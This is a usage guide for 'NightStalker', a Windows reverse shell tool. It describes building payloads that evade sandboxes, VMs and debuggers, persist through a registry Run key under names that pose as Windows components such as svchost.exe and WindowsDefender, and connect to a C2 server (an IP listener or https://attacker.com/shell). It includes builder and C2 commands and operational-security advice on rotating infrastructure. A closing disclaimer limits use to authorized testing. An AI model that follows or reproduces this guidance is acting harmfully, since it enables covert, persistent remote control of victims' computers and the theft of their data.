# NightStalker - Stealth Reverse Shell Payload Guide

## Overview

The NightStalker Stealth Reverse Shell is an advanced, persistent reverse shell payload designed for Windows targets with built-in anti-detection, encryption, and persistence mechanisms.

## Features

### Core Capabilities
- **Encrypted Communication**: XOR encryption with base64 encoding
- **Anti-Detection**: VM/sandbox detection, debugger detection
- **Persistence**: Registry-based persistence with system-looking names
- **Stealth**: Hidden console, system-looking filenames
- **Reconnection**: Automatic reconnection with randomized jitter
- **Multiple Channels**: Raw socket and HTTPS communication

### Anti-Detection Features
- CPU core count detection
- Sleep timing discrepancy detection
- VM MAC address detection
- Debugger presence detection
- Sandbox timing analysis

### Persistence Mechanisms
- Registry persistence (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- Multiple persistence locations (AppData, Temp, LocalAppData)
- System-looking filenames and registry keys

## Quick Start

### 1. Generate Payload

#### Using the Builder CLI
```bash
# Interactive mode
python payload_builder.py --interactive

# Command line mode
python payload_builder.py --lhost 192.168.1.100 --lport 4444

# With custom options
python payload_builder.py --lhost 10.0.0.5 --lport 8080 --name svchost.exe --reg-key WindowsSecurity
```

#### Manual Configuration
Edit the configuration section in `stealth_reverse_shell.py`:
```python
LHOST = "192.168.1.100"          # C2 Server IP
LPORT = 4444                     # C2 Server Port
PAYLOAD_NAME = "winupdate.exe"   # Name for the copied payload
REG_KEY_NAME = "WindowsUpdate"   # Registry key name for persistence
ENCRYPTION_KEY = "NightStalker2024!"  # Encryption key
USE_HTTPS = False                # Use HTTPS instead of raw socket
```

### 2. Build Executable
```bash
# Install PyInstaller
pip install pyinstaller

# Build stealth executable
pyinstaller --noconsole --onefile stealth_payload_192.168.1.100_4444.py
```

### 3. Start C2 Server
```bash
# Start C2 server
python c2_server.py --host 0.0.0.0 --port 4444

# With custom encryption key
python c2_server.py --host 0.0.0.0 --port 4444 --key "MyCustomKey123!"
```

### 4. Deploy and Test
```bash
# Deploy the generated executable to target
# The payload will automatically:
# - Copy itself to AppData with system name
# - Set up registry persistence
# - Connect to C2 server
# - Execute commands remotely
```

## Configuration Options

### Basic Configuration
```python
LHOST = "192.168.1.100"          # C2 Server IP address
LPORT = 4444                     # C2 Server port number
PAYLOAD_NAME = "winupdate.exe"   # Filename for persistence copy
REG_KEY_NAME = "WindowsUpdate"   # Registry key name for persistence
ENCRYPTION_KEY = "NightStalker2024!"  # 16, 24, or 32 byte encryption key
```

### Communication Settings
```python
USE_HTTPS = False                # Use HTTPS instead of raw socket
C2_URL = "https://attacker.com/shell"  # HTTPS C2 URL (if USE_HTTPS=True)
```

### System Names (Auto-generated)
The payload builder can generate system-looking names:

**Filenames:**
- winupdate.exe, svchost.exe, lsass.exe, csrss.exe
- winlogon.exe, services.exe, spoolsv.exe, explorer.exe
- rundll32.exe, regsvr32.exe, msiexec.exe, wscript.exe

**Registry Keys:**
- WindowsUpdate, SystemRestore, SecurityCenter, WindowsDefender
- MicrosoftUpdate, WindowsSecurity, SystemMaintenance, WindowsService

## Usage Examples

### Basic Socket Communication
```bash
# Generate payload
python payload_builder.py --lhost 192.168.1.100 --lport 4444

# Start C2 server
python c2_server.py --port 4444

# Deploy payload.exe to target
# Commands will be executed remotely
```

### HTTPS Communication
```bash
# Generate HTTPS payload
python payload_builder.py --lhost 10.0.0.5 --lport 443 --https --url https://attacker.com/shell

# Set up HTTPS C2 server at https://attacker.com/shell
# Deploy payload to target
```

### Custom Configuration
```bash
# Generate with custom settings
python payload_builder.py \
  --lhost 172.16.0.10 \
  --lport 8080 \
  --name svchost.exe \
  --reg-key WindowsSecurity \
  --encryption-key "MySecretKey2024!" \
  --output custom_payload.py
```

## C2 Server Commands

Once connected, use these commands:

```bash
# Basic commands
help                    # Show available commands
list                    # List connected clients
kill <client>          # Disconnect specific client
exit/quit              # Exit C2 server

# Remote execution
whoami                 # Get current user
ipconfig               # Network configuration
systeminfo             # System information
dir                    # Directory listing
type <file>            # Read file contents
```

## Anti-Detection Features

### VM Detection
- **CPU Cores**: Detects VMs with < 2 CPU cores
- **MAC Addresses**: Detects common VM MAC prefixes
- **Vendor Strings**: Detects VM vendor indicators

### Sandbox Detection
- **Sleep Timing**: Detects timing discrepancies
- **Execution Environment**: Analyzes execution context

### Debugger Detection
- **IsDebuggerPresent**: Windows API debugger detection
- **Timing Analysis**: Execution timing analysis

## Persistence Locations

The payload automatically copies itself to one of these locations:
1. `%APPDATA%\winupdate.exe`
2. `%TEMP%\winupdate.exe`
3. `%LOCALAPPDATA%\winupdate.exe`

Registry persistence is set at:
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate`

## Security Considerations

### Encryption
- XOR encryption with base64 encoding
- Customizable encryption keys
- Encrypted command and response communication

### Stealth Features
- Hidden console window
- System-looking filenames
- Registry persistence with legitimate names
- Background execution

### Anti-Analysis
- VM and sandbox detection
- Debugger detection
- Timing analysis
- Automatic exit on detection

## Troubleshooting

### Common Issues

**Payload won't connect:**
- Check firewall settings
- Verify LHOST/LPORT configuration
- Ensure C2 server is running

**Commands not executing:**
- Check encryption key matches between payload and server
- Verify network connectivity
- Check antivirus interference

**Persistence not working:**
- Check registry permissions
- Verify payload copy location
- Ensure system restart for persistence test

### Debug Mode
Enable debug logging by uncommenting the log line in the payload:
```python
def log(self, message):
    # Uncomment for debugging
    with open("C:\\temp\\debug.log", "a") as f: 
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
```

## Advanced Usage

### Custom Anti-Detection
Add custom detection methods:
```python
def custom_detection(self):
    # Add your custom detection logic
    if self.check_custom_indicators():
        return True
    return False
```

### Custom Persistence
Implement additional persistence methods:
```python
def setup_custom_persistence(self):
    # Add scheduled task persistence
    # Add startup folder persistence
    # Add service persistence
    pass
```

### Custom Communication
Extend communication channels:
```python
def custom_communication(self):
    # Add DNS tunneling
    # Add email communication
    # Add social media channels
    pass
```

## Best Practices

### Operational Security
1. **Use unique encryption keys** for each operation
2. **Rotate C2 infrastructure** regularly
3. **Use HTTPS communication** when possible
4. **Implement proper logging** for debugging
5. **Test in isolated environment** first

### Payload Customization
1. **Change default names** and keys
2. **Customize anti-detection** for target environment
3. **Adjust reconnection timing** based on network
4. **Test persistence** in target environment
5. **Verify encryption** works correctly

### C2 Infrastructure
1. **Use dedicated servers** for C2
2. **Implement proper authentication**
3. **Monitor for detection**
4. **Have backup communication** channels
5. **Secure C2 server** properly

## Legal and Ethical Use

This tool is designed for:
- **Authorized penetration testing**
- **Security research**
- **Educational purposes**
- **Red team operations**

**Always obtain proper authorization** before using this tool against any system or network.

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review the configuration options
3. Test in isolated environment
4. Enable debug logging for detailed analysis

---

**Remember**: This tool is for authorized security testing only. Always follow responsible disclosure practices and obtain proper permissions before use. 